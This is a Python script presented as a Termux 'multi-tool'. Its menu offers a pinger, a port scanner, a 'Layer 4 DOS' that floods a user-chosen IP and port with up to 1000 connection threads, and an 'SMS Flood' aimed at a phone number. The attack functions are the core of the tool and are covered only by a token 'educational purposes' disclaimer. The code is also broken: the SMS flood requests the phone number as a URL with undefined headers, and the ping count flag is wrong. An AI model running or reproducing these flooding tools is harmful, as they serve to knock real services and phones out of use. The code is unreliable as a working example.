#!/usr/bin/env python3

import socket
import subprocess
import threading
import time
import sys
import os
import random
from concurrent.futures import ThreadPoolExecutor
import requests

# ANSI Color codes for Termux compatibility
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def clear_screen():
    os.system('clear')

def print_banner():
    banner = f"""
{Colors.RED}{Colors.BOLD}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⢻⣿⣿⡆⠀⠸⣿⠀⠀⠀
⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀
⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀
⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀
⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀
⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⡟⠀⡿⠀⠀⢀⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁
 ██████╗     ██████╗      ██╗    ███╗   ███╗
██╔════╝     ██╔══██╗    ███║    ████╗ ████║
██║  ███╗    ██████╔╝    ╚██║    ██╔████╔██║
██║   ██║    ██╔══██╗     ██║    ██║╚██╔╝██║
╚██████╔╝    ██║  ██║     ██║    ██║ ╚═╝ ██║
 ╚═════╝     ╚═╝  ╚═╝     ╚═╝    ╚═╝     ╚═╝        
{Colors.END}
    {Colors.YELLOW}{Colors.END}
    {Colors.RED} {Colors.END}
    """
    print(banner)

def print_menu():
    menu = f"""
{Colors.RED}{Colors.BOLD}
    ┌─────────────────────────────────────────┐
    │                    MENU                 │
    ├─────────────────────────────────────────┤
    │  {Colors.CYAN}[1]{Colors.RED} IP Pinger                          │
    │  {Colors.CYAN}[2]{Colors.RED} Port Scanner                       │
    │  {Colors.CYAN}[3]{Colors.RED} DOS Tool                           │
    │  {Colors.CYAN}[4]{Colors.RED} SMS Flood                          |
    │  {Colors.CYAN}[5]{Colors.RED} About                              │
    │  {Colors.CYAN}[0]{Colors.RED} Exit                               │
    └─────────────────────────────────────────┘
{Colors.END}"""
    print(menu)

def ping_host(host, count=5):
    print(f"\n{Colors.YELLOW}[+] Pinging {host}...{Colors.END}")
    try:
        result = subprocess.run(['ping', '-s', str(count), host], 
                              capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            print(f"{Colors.GREEN}✓ Host is reachable:{Colors.END}")
            print(result.stdout)
        else:
            print(f"{Colors.RED}✗ Host unreachable or error occurred{Colors.END}")
            print(result.stderr)
    except subprocess.TimeoutExpired:
        print(f"{Colors.RED}✗ Ping timeout{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}✗ Error: {e}{Colors.END}")

def scan_port(host, port, timeout=3):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        if result == 0:
            try:
                service = socket.getservbyport(port)
            except:
                service = "unknown"
            print(f"{Colors.GREEN}[+] Port {port}/tcp open - {service}{Colors.END}")
            return True
        return False
    except:
        return False

def port_scanner():
    print(f"\n{Colors.CYAN}=== PORT SCANNER ==={Colors.END}")
    host = input(f"{Colors.YELLOW}Enter target IP/hostname: {Colors.END}")
    
    scan_type = input(f"{Colors.YELLOW}Scan type - [1] Common ports [2] Custom range: {Colors.END}")
    
    if scan_type == "1":
        ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080]
    else:
        start = int(input(f"{Colors.YELLOW}Start port: {Colors.END}"))
        end = int(input(f"{Colors.YELLOW}End port: {Colors.END}"))
        ports = range(start, end + 1)
    
    print(f"\n{Colors.YELLOW}[+] Scanning {host}...{Colors.END}")
    open_ports = []
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(scan_port, host, port): port for port in ports}
        for future in futures:
            if future.result():
                open_ports.append(futures[future])
    
    if open_ports:
        print(f"\n{Colors.GREEN}[+] Found {len(open_ports)} open ports{Colors.END}")
    else:
        print(f"\n{Colors.RED}[-] No open ports found{Colors.END}")

def layer4_dos():
    print(f"\n{Colors.RED}=== LAYER 4 DOS TOOL ==={Colors.END}")
    print(f"{Colors.YELLOW}{Colors.END}")
    
    target = input(f"{Colors.YELLOW}Target IP: {Colors.END}")
    port = int(input(f"{Colors.YELLOW}Target port: {Colors.END}"))
    threads = int(input(f"{Colors.YELLOW}Number of threads (50-1000): {Colors.END}"))
    
    if threads > 50:
        threads = 1000
    
    print(f"\n{Colors.RED}[!] Starting SYN flood attack on {target}:{port}{Colors.END}")
    print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop{Colors.END}")
    
    def syn_flood():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, port))
                sock.close()
            except:
                pass
    
    try:
        for i in range(threads):
            thread = threading.Thread(target=syn_flood)
            thread.daemon = True
            thread.start()
            
            requests_sent = 0
        while True:
            time.sleep(1)
            requests_sent += threads
            print(f"\r{Colors.CYAN}[+] Requests sent: {requests_sent}{Colors.END}", end="")
    except KeyboardInterrupt:
        print(f"\n{Colors.GREEN}[+] Attack stopped{Colors.END}")
        
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.GREEN}[+] Attack stopped{Colors.END}")

def sms_flood():
    print(f"\n{Colors.RED}=== SMS FLOOD  ==={Colors.END}")
    print(f"{Colors.YELLOW}{Colors.END}")
    
    target = input(f"{Colors.YELLOW}Target Number: {Colors.END}")
    threads = int(input(f"{Colors.YELLOW}Number of threads (50-100): {Colors.END}"))
    
    if threads > 50:
        threads = 1000
    
    
    
    print(f"\n{Colors.RED}[!] Starting SMS  flood attack on {target}{Colors.END}")
    print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop{Colors.END}")
    
    def sms_flood():
        while True:
            try:
                response = requests.get(target, headers=headers, timeout=5)
            except:
                pass
    
    try:
        for i in range(threads):
            thread = threading.Thread(target=sms_flood)
            thread.daemon = True
            thread.start()
        
        Messages_sent = 0
        while True:
            time.sleep(1)
            Messages_sent += threads
            print(f"\r{Colors.CYAN}[+] Messages sent: {Messages_sent}{Colors.END}", end="")
    except KeyboardInterrupt:
        print(f"\n{Colors.GREEN}[+] Attack stopped{Colors.END}")



def show_about():
    about = f"""
{Colors.PURPLE}{Colors.BOLD}
    ╔════════════════════════════════════════════════════════╗
    ║                        ABOUT                           ║
    ╠════════════════════════════════════════════════════════╣
    ║  Tool: Python Multi-Tool for Termux                   ║
    ║  Version: 1.0                                         ║
    ║  Platform: Android (Termux)                           ║
    ║                                                       ║
    ║  Features:                                            ║
    ║  • IP Pinger with detailed output                     ║
    ║  • Advanced Port Scanner                              ║
    ║  • Layer 4 DOS (SYN Flood)                            ║                   
    ║  • SMS Flood (SMS Flood)                              ║
    ║                                                       ║
    ║ {Colors.RED}MADE BY: {Colors.PURPLE}                  ║ 
    ║  {Colors.RED}Lemonaidd the swaggest {Colors.PURPLE}   ║
    ║  {Colors.CYAN}guns.lol/iluvlemonaidd{Colors.PURPLE}   ║
    ║  {Colors.CYAN}guns.lol/islitherclit{Colors.PURPLE}    ║
    ║                                                       ║   
    ║                                                       ║  
    ║                                                       ║
    ║  {Colors.RED}LEGAL DISCLAIMER:{Colors.PURPLE}         ║
    ║  This tool is for educational purposes only.          ║
    ║  Only use on systems you own or have explicit         ║
    ║  permission to test. Unauthorized access is illegal.  ║
    ║                                                       ║
    ╚════════════════════════════════════════════════════════╝
{Colors.END}"""
    print(about)
    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")

def main():
    while True:
        clear_screen()
        print_banner()
        print_menu()
        
        try:
            choice = input(f"\n{Colors.CYAN}Select option: {Colors.END}")
            
            if choice == "1":
                host = input(f"{Colors.YELLOW}Enter IP/hostname to ping: {Colors.END}")
                count = input(f"{Colors.YELLOW}Number of pings (default 4): {Colors.END}")
                count = int(count) if count else 4
                ping_host(host, count)
                input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
                
            elif choice == "2":
                port_scanner()
                input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
                
            elif choice == "3":
                layer4_dos()
                input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
                
            elif choice == "4":
                sms_flood()
                input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
                
            
            elif choice == "5":
                show_about()
                
                
            elif choice == "0":
                print(f"\n{Colors.GREEN}[+] Goodbye!{Colors.END}")
                sys.exit(0)
                
            else:
                print(f"{Colors.RED}[-] Invalid option!{Colors.END}")
                time.sleep(2)
                
        except KeyboardInterrupt:
            print(f"\n\n{Colors.GREEN}[+] Goodbye!{Colors.END}")
            sys.exit(0)
        except Exception as e:
            print(f"{Colors.RED}[-] Error: {e}{Colors.END}")
            time.sleep(2)

if __name__ == "__main__":
    main()
